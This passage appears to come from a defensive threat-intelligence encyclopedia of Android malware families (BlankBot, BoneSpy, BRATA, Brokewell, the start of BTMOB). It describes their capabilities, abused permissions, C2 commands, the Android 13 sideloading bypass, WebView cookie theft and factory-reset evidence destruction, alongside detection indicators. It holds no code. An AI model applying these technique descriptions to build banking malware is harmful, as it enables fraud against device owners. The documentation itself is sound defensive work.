By controlling the keyboard itself, BlankBot captures every character the victim types regardless of which application is active, bypassing protections that some banking apps implement to detect accessibility-based keyloggers.</p>"},{"location":"malware/families/blankbot/#screen-recording","title":"Screen Recording","text":"<p>BlankBot leverages Android's MediaProjection API to initiate screen capture and the MediaRecorder API to record the output. Captured screen content is encoded as Base64 JPEG images and transmitted to the C2 server. This provides operators with visual confirmation of victim activity, overlay effectiveness, and any on-screen data that keylogging alone would not capture (such as autofilled credentials or biometric prompts).</p>"},{"location":"malware/families/blankbot/#custom-overlay-injections","title":"Custom Overlay Injections","text":"<p>The trojan creates customizable overlay windows that render on top of legitimate banking and financial applications. These overlays present fake input fields designed to mimic the target application's login or payment interface, soliciting banking credentials, payment card details, and personal information. The overlays are served from the C2, allowing operators to update phishing templates without pushing new malware builds to infected devices.</p>"},{"location":"malware/families/blankbot/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Remote gesture execution, overlay triggering, UI monitoring SYSTEM_ALERT_WINDOW Custom overlay windows for credential theft READ_SMS SMS message exfiltration RECEIVE_SMS Real-time SMS interception for OTP theft READ_CONTACTS Contact list harvesting READ_PHONE_STATE Device fingerprinting QUERY_ALL_PACKAGES Enumerate all installed applications REQUEST_INSTALL_PACKAGES Session-based package installer for payload deployment REQUEST_DELETE_PACKAGES Uninstall arbitrary applications INTERNET HTTP and WebSocket C2 communication FOREGROUND_SERVICE Persistent background operation RECEIVE_BOOT_COMPLETED Restart after device reboot WAKE_LOCK Keep device active during screen recording and remote control"},{"location":"malware/families/blankbot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/blankbot/#android-13-restriction-bypass","title":"Android 13 Restriction Bypass","text":"<p>BlankBot uses a session-based package installer to circumvent restrictions introduced in Android 13 that prevent sideloaded applications from requesting dangerous permissions (particularly accessibility service access). The malware first prompts the victim to allow installation from third-party sources, then retrieves an unencrypted APK from its assets directory and initiates installation through the session-based installer API. This technique, also employed by Mandrake, exploits the fact that session-based installations are treated differently by Android's permission framework than standard sideloaded installs.</p>"},{"location":"malware/families/blankbot/#c2-communication","title":"C2 Communication","text":"<p>BlankBot establishes initial contact with its C2 server by sending device information in an HTTP GET request. After this handshake, communication switches to the WebSocket protocol for persistent, bidirectional messaging. Bot commands received over WebSocket control all major functions: starting and stopping screen recording, executing gestures, creating overlay windows, collecting device data, and managing applications on the device.</p>"},{"location":"malware/families/blankbot/#development-indicators","title":"Development Indicators","text":"<p>Intel 471's analysis noted several indicators of active development across BlankBot samples:</p> <ol> <li>Multiple code variants with divergent implementations of the same features</li> <li>Extensive debug logging left in production builds</li> <li>Partially implemented functionality alongside fully operational modules</li> <li>Variation in obfuscation levels between samples</li> </ol>"},{"location":"malware/families/blankbot/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Initial handshake HTTP GET request with device information Persistent channel WebSocket protocol for bidirectional command and control Screen data format Base64-encoded JPEG images transmitted over WebSocket Command delivery WebSocket messages for screen recording control, gesture execution, overlay management, data collection Overlay templates Served from C2, allowing remote updates without new APK builds"},{"location":"malware/families/blankbot/#target-regions","title":"Target Regions","text":"Period Primary Targets June-July 2024 Turkish Android users <p>Application names, UI strings, and embedded language resources all point to Turkish users as the primary targets. The trojan's overlay injection framework is generic enough to target applications in any region, and given BlankBot's active development trajectory, expansion beyond Turkey is a natural progression.</p>"},{"location":"malware/families/blankbot/#notable-campaigns","title":"Notable Campaigns","text":"<p>July 2024: Intel 471 disclosed BlankBot after discovering multiple samples disguised as utility applications targeting Turkish users. The trojan was under active development with multiple code variants, but already featured functional screen recording, custom keyboard keylogging, overlay injections, and WebSocket-based remote control. Nearly all samples were undetected by antivirus scanners at the time of discovery.</p> <p>August 2024: Zimperium published a supplementary analysis confirming BlankBot's capabilities and noting that the trojan could not evade on-device machine learning detection, providing a detection advantage for devices with ML-based security solutions deployed.</p>"},{"location":"malware/families/blankbot/#related-families","title":"Related Families","text":"Family Relationship Frogblight Both implement custom InputMethodService keyboards for keylogging rather than relying solely on accessibility event monitoring. Frogblight is also a Turkish-focused banking trojan. Mandrake Both use session-based package installation to bypass Android 13 sideloading restrictions on dangerous permissions. Antidot Both use WebSocket for C2 communication and combine overlay attacks with remote device control, though Antidot adds VNC-based screen streaming rather than screen recording. Brokewell Both were under rapid, active development when first discovered, with near-daily capability additions. Both combine screen capture with remote control. Crocodilus Both bypass Android 13+ restrictions on sideloaded app permissions, though through different mechanisms."},{"location":"malware/families/blankbot/#detection","title":"Detection","text":"Indicator Type Details Custom keyboard App registering an <code>InputMethodService</code> without being a legitimate keyboard application MediaProjection abuse Screen capture permissions requested by a utility app Session-based installation Use of <code>PackageInstaller.Session</code> API to bypass Android 13 sideloading restrictions WebSocket traffic Persistent WebSocket connections to unknown servers from a utility app Debug logging Excessive <code>Log</code> calls in production builds (early samples) Turkish-language resources Application names and strings in Turkish"},{"location":"malware/families/blankbot/#references","title":"References","text":"<ul> <li>Intel 471 - BlankBot: A New Android Banking Trojan (July 2024)</li> <li>Zimperium - BlankBot: New Android Banking Trojan (August 2024)</li> </ul>"},{"location":"malware/families/bonespy/","title":"BoneSpy","text":"<p>BoneSpy is an Android surveillanceware family discovered by Lookout in December 2024, originally attributed to Gamaredon (also tracked as Primitive Bear and Shuckworm, a Russian FSB-linked APT group). Lookout subsequently reattributed BoneSpy and its companion family PlainGnome to Sandcat, a threat actor associated with Uzbekistan's State Security Service (SSS). The initial Gamaredon attribution was based on dynamic DNS provider usage and IP address overlaps between mobile and desktop C2 infrastructure. BoneSpy is derived from the open-source Russian surveillance application DroidWatcher (developed 2013-2014), sharing nearly identical code, class names, and log messages for database handling related to call logs, location tracking, SMS, notifications, and browser bookmarks. Active since at least 2021, BoneSpy targets Russian-speaking victims in Central Asian former Soviet states, primarily Uzbekistan, Kazakhstan, Tajikistan, and Kyrgyzstan. Distribution relies on trojanized Telegram apps, fake Samsung Knox apps, and social engineering lures. BoneSpy and PlainGnome represent the first known mobile malware families linked to the Gamaredon/Sandcat operational space, which previously focused exclusively on Windows-based operations.</p>"},{"location":"malware/families/bonespy/#quick-reference","title":"Quick Reference","text":"Attribute Details First Seen 2021 Last Seen Active as of December 2024 Status Active Type Surveillanceware Attribution Originally Gamaredon (FSB-linked); reattributed to Sandcat (Uzbekistan SSS) Aliases None known Lineage Based on DroidWatcher open-source surveillance app (2013-2014) Distribution Trojanized Telegram apps, fake Samsung Knox, battery monitoring lures, photo gallery lures Related PlainGnome (companion family by same operator)"},{"location":"malware/families/bonespy/#capabilities","title":"Capabilities","text":"Capability Details SMS collection Harvests all SMS messages Call logs Extracts call history Phone call audio Records voice calls Contacts Exfiltrates device contact list GPS location Tracks device coordinates Camera capture Takes photos via device cameras Ambient audio Records microphone audio Browser history Collects browsing data and bookmarks Notifications Intercepts and reads notifications from all apps Screenshots Captures device screen Cellular provider info Collects SIM and carrier details SMS-based control Can receive commands via SMS messages <p>BoneSpy's SMS command capability is a notable feature: operators can issue instructions to the implant through SMS, providing an out-of-band control channel that does not depend on internet connectivity.</p>"},{"location":"malware/families/bonespy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/bonespy/#droidwatcher-lineage","title":"DroidWatcher Lineage","text":"<p>BoneSpy is built directly on the DroidWatcher codebase. DroidWatcher was a Russian open-source surveillance application developed between 2013 and 2014. BoneSpy retains nearly identical code structure, class names, and log messages in multiple classes related to:</p> <ul> <li>Call log database handling</li> <li>Location tracking</li> <li>SMS message storage</li> <li>Notification interception</li> <li>Browser bookmark collection</li> </ul> <p>The operators took this publicly available surveillance framework and extended it for their operational needs, similar to how GuardZoo operators forked the Dendroid RAT codebase for military-targeted surveillance in the Middle East.</p>"},{"location":"malware/families/bonespy/#architecture","title":"Architecture","text":"<p>Unlike PlainGnome, BoneSpy is a standalone single-stage application. There is no dropper, the full surveillance functionality is packaged in a single APK. This simpler architecture makes BoneSpy easier to deploy but also easier to analyze, as the complete capability set is visible through static analysis of one package.</p>"},{"location":"malware/families/bonespy/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>The initial attribution to Gamaredon was based on overlaps between BoneSpy's C2 infrastructure and known Gamaredon desktop campaigns:</p> <ul> <li>Shared use of dynamic DNS providers</li> <li>IP address overlaps between mobile C2 domains and desktop campaign infrastructure</li> </ul> <p>Lookout later determined these overlaps pointed to Sandcat rather than Gamaredon, though the two groups share operational patterns in their infrastructure management.</p>"},{"location":"malware/families/bonespy/#distribution","title":"Distribution","text":"<p>BoneSpy has never been observed on Google Play. Distribution appears to rely on targeted social engineering, directing victims to download APKs from attacker-controlled sources.</p> Lure Type Details Trojanized Telegram Fully functional Telegram app bundled with BoneSpy surveillance payload Fake Samsung Knox Impersonates Samsung's enterprise security platform Battery monitoring apps Fake battery charge monitoring utilities Photo gallery apps Disguised as photo gallery applications <p>Samples from January through September 2022 used the widest variety of trojanized app lures. The trojanized Telegram approach is particularly effective against Russian-speaking targets in Central Asia, where Telegram is a primary communication platform.</p>"},{"location":"malware/families/bonespy/#target-regions","title":"Target Regions","text":"Region Details Uzbekistan Primary target based on VirusTotal submission data Kazakhstan Secondary target Tajikistan Secondary target Kyrgyzstan Secondary target <p>Targeting aligns with Sandcat's known operational focus. Amnesty International reported in 2019 that Sandcat targeted academic and government organizations in countries neighboring Uzbekistan, as well as human rights defenders within Uzbekistan itself.</p>"},{"location":"malware/families/bonespy/#attribution","title":"Attribution","text":"<p>Lookout initially attributed BoneSpy and PlainGnome to Gamaredon (Primitive Bear/Shuckworm), a group linked to Russia's FSB, based on dynamic DNS and IP address overlaps with Gamaredon's desktop campaigns. Lookout later updated the attribution to Sandcat, an Uzbekistan-based threat actor associated with Uzbekistan's State Security Service. Sandcat was first identified in 2019. The reattribution is significant because it means these families represent Uzbekistan's mobile surveillance capability rather than Russia's, though the DroidWatcher codebase and Russian-language targeting reflect the Russian-speaking operational environment of Central Asian intelligence services.</p>"},{"location":"malware/families/bonespy/#related-families","title":"Related Families","text":"Family Relationship PlainGnome Companion family by the same operator. PlainGnome is custom-built (not based on DroidWatcher) and uses a two-stage dropper architecture, representing an evolution beyond BoneSpy's single-stage design. GuardZoo Both are state-linked surveillance tools built on open-source foundations (BoneSpy from DroidWatcher, GuardZoo from Dendroid RAT), targeting specific regional populations through social engineering rather than exploit chains. KoSpy Both are state-sponsored Android surveillance tools discovered by Lookout, targeting regional populations. KoSpy serves North Korean intelligence while BoneSpy serves Central Asian intelligence operations."},{"location":"malware/families/bonespy/#references","title":"References","text":"<ul> <li>Lookout: BoneSpy and PlainGnome Android Surveillance</li> <li>The Hacker News: Gamaredon Deploys Android Spyware BoneSpy and PlainGnome</li> <li>BleepingComputer: Russian cyberspies target Android users with new spyware</li> <li>Security Affairs: First mobile malware families linked to Gamaredon</li> <li>SecurityOnline: Gamaredon APT Deploys Two Russian Android Spyware Families</li> <li>Infosecurity Magazine: Lookout Discovers New Spyware Deployed by Russia and China</li> </ul>"},{"location":"malware/families/brata/","title":"BRATA","text":"<p>BRATA (Brazilian Remote Access Tool Android) is the banking trojan best known for factory-resetting victim devices after completing fraudulent wire transfers, destroying forensic evidence in the process. Originally targeting Brazilian users when Kaspersky first documented it in 2019, BRATA later expanded to European banking customers with increasingly aggressive capabilities. Cleafy tracked its evolution through multiple variants and ultimately reclassified the operation as an Advanced Persistent Threat. ThreatFabric later clarified that what the industry labeled \"BRATA\" was actually three distinct families: the original BRATA, AmexTroll, and Copybara.</p>"},{"location":"malware/families/brata/#overview","title":"Overview","text":"Attribute Details First Seen January 2019 Last Seen Mid-2022 (evolved into AmexTroll/Copybara) Status Original BRATA inactive; descendant families still active Type Banking trojan / RAT Attribution Unknown; Brazilian origin, later operations suggest possible Italian-speaking actors Aliases BRATA.A, BRATA.B, BRATA.C, AmexTroll Development Tool B4A (Basic4Android) framework"},{"location":"malware/families/brata/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Brata ThreatFabric BRATA / AmexTroll McAfee Android/Brata ESET Android/Spy.Brata Cleafy BRATA Trend Micro AndroidOS_Brata Dr.Web Android.BankBot.Brata Malwarebytes Android/Trojan.Spy.Brata Symantec Trojan.Gen.MBT"},{"location":"malware/families/brata/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Kaspersky researchers discovered BRATA in early 2019, identifying over 20 variants hosted on the Google Play Store disguised as WhatsApp updates and other popular apps. The malware targeted exclusively Brazilian users at this stage, combining remote access capabilities with credential theft.</p> <p>McAfee documented BRATA's expansion beyond Brazil, finding variants targeting the United States and Spain while continuing to sneak past Google Play's security checks by posing as app security scanners.</p> <p>By late 2021, Cleafy identified three distinct BRATA variants (BRATA.A, BRATA.B, BRATA.C) targeting UK, Italian, and Spanish banks. The January 2022 update introducing the factory reset kill switch marked the peak of BRATA's aggressiveness. Cleafy later reclassified the operation as an APT, noting that the actors would focus on one financial institution at a time and pivot only when the target implemented effective countermeasures.</p> <p>ThreatFabric's \"tale of three families\" analysis resolved the naming confusion by demonstrating that BRATA, AmexTroll, and Copybara are separate families despite being conflated by the broader security community. All three use the B4A (Basic4Android) development framework, which became free in February 2020, roughly coinciding with the appearance of the newer variants.</p>"},{"location":"malware/families/brata/#distribution","title":"Distribution","text":"<p>BRATA's distribution methods evolved as the malware matured and expanded geographically.</p> Vector Details Google Play Original Brazilian campaigns used fake WhatsApp update and security scanner apps. McAfee found variants posing as app security scanners urging users to \"update\" Chrome, WhatsApp, or PDF readers. WhatsApp messages Lure messages distributed to Brazilian users via WhatsApp, exploiting CVE-2019-3568 as a lure theme Smishing SMS messages impersonating banks, containing links to fake download pages Sponsored search results Paid Google ads directing to BRATA download pages Phishing sites Spoofed banking portals that instruct victims to download a \"security app\" <p>The European campaigns shifted to smishing and vishing as the primary delivery method. Victims received SMS appearing to originate from their bank, followed in some cases by a phone call from an operator impersonating bank support, who guided them through installing the malware.</p>"},{"location":"malware/families/brata/#capabilities","title":"Capabilities","text":"<p>BRATA's capabilities expanded substantially across its lifecycle, from a relatively simple RAT to a full banking fraud platform with evidence destruction.</p>"},{"location":"malware/families/brata/#original-2019-brazil-focused","title":"Original (2019, Brazil-focused)","text":"Capability Implementation Screen capture Real-time screen recording and streaming Keylogging Capture keystrokes via accessibility service Remote interaction Tap, swipe, and type on victim device remotely App listing Enumerate installed applications Device unlock Capture and replay PIN/pattern/password to unlock device Phishing overlays Display fake banking login pages over legitimate apps"},{"location":"malware/families/brata/#european-expansion-late-2021","title":"European Expansion (Late 2021)","text":"<p>Cleafy documented three variants with distinct targeting:</p> Variant Targets Distinguishing Feature BRATA.A UK, Italy, Spain GPS tracking, device admin abuse, full overlay injects BRATA.B Italy Dedicated phishing page for one specific Italian bank BRATA.C Italy Dropper-based delivery, installs secondary payload"},{"location":"malware/families/brata/#kill-switch-update-january-2022","title":"Kill Switch Update (January 2022)","text":"<p>Cleafy's analysis of the factory reset capability documented these additions:</p> Capability Implementation Factory reset (kill switch) Wipes device to factory defaults after successful wire transfer or when analysis is detected GPS tracking Continuous location monitoring of infected devices HTTP/WebSocket C2 WebSocket protocol added alongside HTTP for command delivery Keylogging Enhanced keystroke capture across all applications SMS interception Read and forward SMS for OTP capture Device admin Abuse BIND_DEVICE_ADMIN to prevent uninstallation and enable factory reset"},{"location":"malware/families/brata/#apt-phase-mid-2022","title":"APT Phase (Mid-2022)","text":"<p>Cleafy's APT reclassification report noted behavioral shifts:</p> Behavior Details Targeted focus Attacks concentrated on one financial institution at a time Adaptive pivoting Shifted targets when banks deployed countermeasures Infrastructure rotation Frequent C2 domain changes Improved evasion Additional obfuscation and anti-analysis techniques"},{"location":"malware/families/brata/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/brata/#factory-reset-as-evidence-destruction","title":"Factory Reset as Evidence Destruction","text":"<p>The factory reset mechanism is BRATA's signature technique. The C2 sends a <code>byebye_format</code> command that triggers the device's built-in factory reset via device admin privileges. This fires in two scenarios:</p> <ol> <li>After a successful fraudulent wire transfer, to eliminate traces of the malware and the transaction</li> <li>When the malware detects it is running in a virtual environment or analysis sandbox</li> </ol> <p>The victim loses all data on the device, making forensic recovery extremely difficult. From the attacker's perspective, this buys time before the fraud is discovered, as the victim must first deal with a wiped device before they can check their bank account.</p>"},{"location":"malware/families/brata/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>BRATA uses the Android accessibility service for:</p> <ol> <li>Capturing screen content and keystrokes</li> <li>Auto-granting runtime permissions (SMS, phone, storage)</li> <li>Detecting foreground applications to trigger overlays</li> <li>Performing automated gestures for remote device control</li> <li>Preventing navigation to device settings for uninstallation</li> </ol>"},{"location":"malware/families/brata/#c2-communication","title":"C2 Communication","text":"<p>Early BRATA variants used standard HTTP POST for C2 communication. The January 2022 update added WebSocket support:</p> Protocol Usage HTTP POST Registration, data exfiltration, inject retrieval WebSocket Real-time command delivery for interactive sessions <p>Key C2 commands:</p> Command Action <code>screen_capture</code> Capture and stream device screen <code>byebye_format</code> Factory reset the device <code>whoami</code> Retrieve device information and state <code>sentSMS</code> Send SMS from victim device <code>getContacts</code> Exfiltrate contact list <code>startApp</code> Launch specified application"},{"location":"malware/families/brata/#b4a-framework","title":"B4A Framework","text":"<p>BRATA and its related families (AmexTroll, Copybara) are built using Basic4Android (B4A), a rapid Android development framework based on a BASIC-like language. B4A generates standard APKs but produces a distinctive code structure that is identifiable during static analysis. The framework became free in February 2020, lowering the barrier for adoption.</p>"},{"location":"malware/families/brata/#anti-analysis","title":"Anti-Analysis","text":"Technique Method String obfuscation Encrypted strings resolved at runtime Emulator detection Checks build properties and hardware characteristics Country/language check Verifies device locale matches target region, refuses to run otherwise Commercial packer Later variants wrapped in commercial packing solutions Factory reset on detection Wipes device if sandbox/analysis environment is detected"},{"location":"malware/families/brata/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>BRATA's geographic scope expanded dramatically from its Brazilian origins.</p> Phase Regions Targets 2019 (Original) Brazil Brazilian banking apps, primarily via Google Play lures 2020 (Expansion) USA, Spain Banking apps, delivered through Play Store security scanner fakes Late 2021 (Europe) UK, Italy, Spain Major European banks, with Italy as primary focus 2022 (APT phase) Italy, Poland, Latin America Concentrated single-institution targeting <p>Italian banks were the heaviest targets during the European phase. BRATA.B was built specifically for a single Italian banking institution, demonstrating the level of targeting precision the operators achieved.</p>"},{"location":"malware/families/brata/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2019: Kaspersky identified BRATA targeting Brazilian users via fake WhatsApp updates on Google Play, with over 20 variants discovered.</p> <p>2020: McAfee reported BRATA variants on Google Play targeting US and Spanish users, disguised as app security scanners that urged victims to install fake updates for Chrome, WhatsApp, and PDF readers.</p> <p>Late 2021: Cleafy detected three new BRATA variants (A, B, C) targeting European banking customers in the UK, Italy, and Spain, with new GPS tracking and overlay capabilities.</p> <p>January 2022: Cleafy published the factory reset analysis, revealing the <code>byebye_format</code> kill switch that wipes devices after fraud completion. The finding attracted widespread media coverage as the first banking trojan to systematically destroy evidence on victim devices.</p> <p>Mid-2022: Cleafy reclassified BRATA as an APT, noting the operators' shift to targeted single-institution attacks with infrastructure rotation and adaptive pivoting when countermeasures were deployed.</p> <p>June 2022: ThreatFabric published \"BRATA: a tale of three families\", clarifying that the \"BRATA\" label covered three distinct families: the original BRATA, AmexTroll (which expanded to UK and Australian targets), and Copybara (which focused on Italian banks with MQTT-based C2). All three used the B4A development framework.</p>"},{"location":"malware/families/brokewell/","title":"Brokewell","text":"<p>Brokewell is an Android banking trojan discovered by ThreatFabric in April 2024 that combines extensive data-stealing capabilities with full remote-control functionality. Attributed to a developer operating under the alias \"Baron Samedit Marais\" through an entity called \"Brokewell Cyber Labs,\" the malware is distributed through fake browser update pages impersonating Google Chrome. Under rapid and active development with new commands added almost daily, Brokewell represents a significant emerging threat to mobile banking security, with reverse engineering revealing code-level connections to the Herodotus banking trojan.</p>"},{"location":"malware/families/brokewell/#overview","title":"Overview","text":"Attribute Details First Seen April 2024 Status Active, under rapid development Type Banking trojan, data stealer, RAT Aliases None known Attribution \"Baron Samedit Marais\" / \"Brokewell Cyber Labs\" Distribution Fake Chrome update pages, fake ID Austria app, fake Klarna app"},{"location":"malware/families/brokewell/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric discovered Brokewell in April 2024 while analyzing a fake Chrome browser update page designed to trick users into downloading a malicious APK. Investigation of the sample revealed a previously undocumented malware family with a broad range of capabilities that appeared to be under very active development.</p> <p>Attribution traces back to an individual using the alias \"Baron Samedit Marais,\" who operates under the name \"Brokewell Cyber Labs.\" ThreatFabric identified this developer through artifacts left in the malware's code and associated infrastructure. The developer maintained a public repository of tools, suggesting confidence in operating openly within the underground ecosystem.</p> <p>Reverse engineering of Brokewell revealed shared obfuscation techniques and code structures with Herodotus, a MaaS banking trojan discovered later in October 2025. Herodotus dynamically loads a Brokewell module at runtime, establishing a direct code-level connection between the two families. Despite these links, Herodotus is attributed to a different threat actor (\"K1R0\"), indicating that Brokewell's codebase has been adopted or licensed by other operators rather than representing a simple rebrand.</p>"},{"location":"malware/families/brokewell/#distribution","title":"Distribution","text":"Vector Details Fake Chrome updates Phishing pages mimicking Google Chrome's update interface Fake ID Austria app Impersonates Austria's digital identity application Fake Klarna app Impersonates the Klarna shopping and payments platform <p>ThreatFabric documented the primary distribution method as fake browser update pages that closely replicate the legitimate Chrome update flow. Victims encounter these pages through malicious redirects or phishing links and are prompted to download what appears to be a critical browser update. The malware has also been observed masquerading as the ID Austria digital identity app and the Klarna financial services app, indicating the operators tailor their lures to specific regional targets.</p>"},{"location":"malware/families/brokewell/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/brokewell/#core-features","title":"Core Features","text":"Capability Implementation Overlay attacks WebView-based inject screens triggered when target banking apps are opened Cookie theft Launches a WebView loading the target site, then extracts session cookies after authentication Audio recording Captures ambient audio from the device microphone Screenshot capture Takes screenshots of the current display on demand Device location Collects GPS coordinates and location data SMS access Reads and exfiltrates SMS messages stored on the device Call log access Harvests call history including numbers, durations, and timestamps Event logging Records all accessibility events including taps, swipes, text input, and app interactions Remote control Full interactive device control via screen streaming and command execution"},{"location":"malware/families/brokewell/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Event logging, credential capture, remote UI interaction SYSTEM_ALERT_WINDOW Overlay injection windows over banking apps READ_SMS SMS exfiltration READ_CONTACTS Contact list harvesting READ_CALL_LOG Call history exfiltration READ_PHONE_STATE Device fingerprinting CAMERA Screenshot capture RECORD_AUDIO Ambient audio recording ACCESS_FINE_LOCATION GPS location tracking INTERNET C2 communication FOREGROUND_SERVICE Persistent background service RECEIVE_BOOT_COMPLETED Restart after reboot REQUEST_INSTALL_PACKAGES Loader installs main payload WAKE_LOCK Keep device awake during remote sessions"},{"location":"malware/families/brokewell/#data-theft","title":"Data Theft","text":"<p>Brokewell's data-stealing capabilities extend well beyond traditional banking trojans. The malware logs every interaction the victim makes with the device through accessibility event monitoring, capturing text typed into any app, elements displayed on screen, and applications opened. This comprehensive event logging builds a complete picture of the victim's device usage.</p> <p>The cookie theft mechanism is particularly notable. Rather than intercepting cookies in transit, Brokewell launches its own WebView instance pointed at a target site (such as accounts.google.com), allows the victim to authenticate normally, then extracts the session cookies from the WebView. This gives operators authenticated session tokens they can use to access victim accounts from their own infrastructure.</p>"},{"location":"malware/families/brokewell/#remote-control","title":"Remote Control","text":"<p>The remote access module provides operators with full interactive control of the infected device:</p> <ol> <li>Screen streaming transmits the device display to the operator in real time</li> <li>Touch simulation allows the operator to perform taps and swipes at arbitrary coordinates</li> <li>Text input enables the operator to type into any field on the device</li> <li>Scroll and navigation commands let the operator move through apps and menus</li> <li>Hardware button simulation triggers back, home, and recent apps actions</li> </ol>"},{"location":"malware/families/brokewell/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/brokewell/#loader-architecture","title":"Loader Architecture","text":"<p>ThreatFabric's analysis revealed that Brokewell uses a loader to bypass Android 13+ restrictions on accessibility service permissions for sideloaded apps. The loader installs the main payload and requests the necessary permissions, working around the protections Google introduced to prevent sideloaded applications from gaining accessibility access.</p>"},{"location":"malware/families/brokewell/#rapid-development-cycle","title":"Rapid Development Cycle","text":"<p>One of Brokewell's most distinguishing characteristics is its development velocity. ThreatFabric observed new commands and capabilities being added to the malware almost daily, with each new version expanding the command set. This cadence suggests a dedicated developer actively building out the platform rather than maintaining a stable, mature product.</p>"},{"location":"malware/families/brokewell/#c2-communication","title":"C2 Communication","text":"<p>The malware communicates with its command-and-control infrastructure to receive commands, exfiltrate stolen data, and stream the device screen for remote access sessions. Configuration and targeting data, including overlay inject pages for banking apps, are served from the C2.</p>"},{"location":"malware/families/brokewell/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Protocol HTTPS for command polling and data exfiltration Screen streaming Real-time device display streamed to operator panel Overlay delivery Inject HTML templates served from C2 for WebView rendering Cookie exfiltration Session cookies from WebView instances transmitted to C2 Command dispatch Growing command set expanded near-daily during active development Attribution artifacts Developer maintained public repository of tooling linked to \"Brokewell Cyber Labs\""},{"location":"malware/families/brokewell/#target-regions","title":"Target Regions","text":"Period Primary Targets April 2024 Austrian banking users (ID Austria lure) 2024 European banking users broadly (Chrome update, Klarna lures) <p>The initial campaigns used lures specific to Austrian users (the ID Austria digital identity app), but the Chrome update and Klarna lures indicate broader European targeting. Given the rapid development pace and expanding feature set, the target scope is expected to grow as the malware matures.</p>"},{"location":"malware/families/brokewell/#notable-campaigns","title":"Notable Campaigns","text":"<p>April 2024: ThreatFabric disclosed Brokewell after discovering it distributed through fake Chrome update pages. Analysis revealed a fully functional banking trojan with data-stealing and remote-control capabilities under rapid development. The developer was identified as \"Baron Samedit Marais\" operating \"Brokewell Cyber Labs,\" with a public repository of tooling associated with the operation.</p> <p>2024 (ongoing): Continued development with near-daily updates expanding the command set and capability matrix. Additional distribution lures including fake ID Austria and Klarna apps were identified, demonstrating campaign diversification alongside technical development.</p> <p>October 2025: ThreatFabric documented Herodotus, a MaaS banking trojan attributed to a different actor (\"K1R0\") that dynamically loads a Brokewell module at runtime. This confirmed that Brokewell's codebase had been adopted or licensed by other operators, extending its reach beyond the original developer.</p>"},{"location":"malware/families/brokewell/#evolution","title":"Evolution","text":"Phase Period Key Changes Initial April 2024 Full banking trojan with overlays, cookie theft, audio recording, screen streaming, remote control Rapid iteration Mid-2024 Near-daily command additions, lure diversification (ID Austria, Klarna) Codebase adoption October 2025 Herodotus loads Brokewell module, establishing cross-family code reuse"},{"location":"malware/families/brokewell/#detection","title":"Detection","text":"Indicator Type Details Comprehensive accessibility logging App logging all accessibility events (taps, swipes, text input, app switches) Cookie theft WebView App launching WebViews for authentication sites (accounts.google.com) without user-visible browser UI Audio recording Background microphone access from a browser update or utility app Screen streaming Persistent outbound data consistent with screen capture streaming Loader behavior APK bypassing Android 13+ accessibility restrictions for sideloaded applications Fake update UI Chrome update page rendered in a WebView prompting APK download"},{"location":"malware/families/brokewell/#related-families","title":"Related Families","text":"Family Relationship Herodotus Shares obfuscation techniques and code structures. Herodotus dynamically loads a Brokewell module, establishing direct code-level links between the two families. Octo Both pioneer screen streaming for on-device fraud. Octo uses MediaProjection at 1 fps; Brokewell uses a comparable approach with accessibility event logging for richer context. Hook Both combine overlay attacks with full remote device control, though Hook derives from the Cerberus lineage while Brokewell is independently developed. Vultur Both use screen recording/streaming for remote access, with Vultur pioneering the approach via AlphaVNC."},{"location":"malware/families/brokewell/#references","title":"References","text":"<ul> <li>ThreatFabric - Brokewell: Do Not Go Broke by New Banking Malware (April 2024)</li> </ul>"},{"location":"malware/families/btmob/","title":"BTMOB RAT","text":"<p>BTMOB RAT is an Android remote access trojan sold as Malware-as-a-Service, evolved from the SpySolr malware (itself based on CraxRAT). Cyble Research and Intelligence Labs (CRIL) published the initial analysis on January 31, 2025, after identifying approximately 15 samples of version 2.5 spreading through phishing sites mimicking the Turkish streaming platform iNat TV and fake cryptocurrency mining services. BTMOB abuses Android's Accessibility Services for credential harvesting, uses WebView-based phishing overlays for login capture, monitors the clipboard for cryptocurrency addresses and passwords, and leverages the Media Projection API for live screen streaming. The threat actor behind BTMOB, tracked as \"evlf_dev,\" actively markets the RAT through Telegram with a tiered licensing model and continuous version updates, with rapid iteration from v2.5 to v4 within a single year.</p>"},{"location":"malware/families/btmob/#overview","title":"Overview","text":"Attribute Details First Seen January 2025 (CRIL identification) Status Active, rapid version iteration (v2.5 through v4 in 2025) Type RAT (MaaS) Attribution \"evlf_dev\" (Telegram-based threat actor) Aliases BT-MOB, BTMob Lineage Evolved from SpySolr, which derives from CraxRAT Pricing $5,000 lifetime license + $300/month updates; $7,000 custom build with private server; $10,000 full source code"},{"location":"malware/families/btmob/#origin-and-lineage","title":"Origin and Lineage","text":"<p>BTMOB descends from SpySolr, an Android RAT that itself derived from CraxRAT, developed by the threat actor EVLF. Cyble's analysis confirmed the lineage through shared C2 structures and codebase patterns, with VirusTotal detections flagging early BTMOB samples under SpySolr signatures. The progression from CraxRAT to SpySolr to BTMOB represents incremental refinement of the same core architecture rather than a ground-up rewrite.</p> <p>The threat actor markets BTMOB through a dedicated Telegram channel, offering tiered licensing: a $5,000 one-time payment for a lifetime license with $300 monthly update fees, $7,000 for a custom version with a private server and admin panel, and $10,000 for the complete source code. This pricing positions BTMOB in the mid-range of the Android MaaS market, below premium offerings like Hook (pre-leak: $7,000/month) but above budget RATs.</p> <p>D3Lab obtained a leaked archive containing the complete BTMOB development toolkit: Android payload source code, dropper, builder environment, Windows operator panel (BTMob.exe), C2 backend, and all dependencies required for full platform deployment. This leak enabled deep analysis of the operator-side infrastructure.</p>"},{"location":"malware/families/btmob/#distribution","title":"Distribution","text":"Vector Details Phishing sites (streaming) Fake iNat TV pages (Turkish 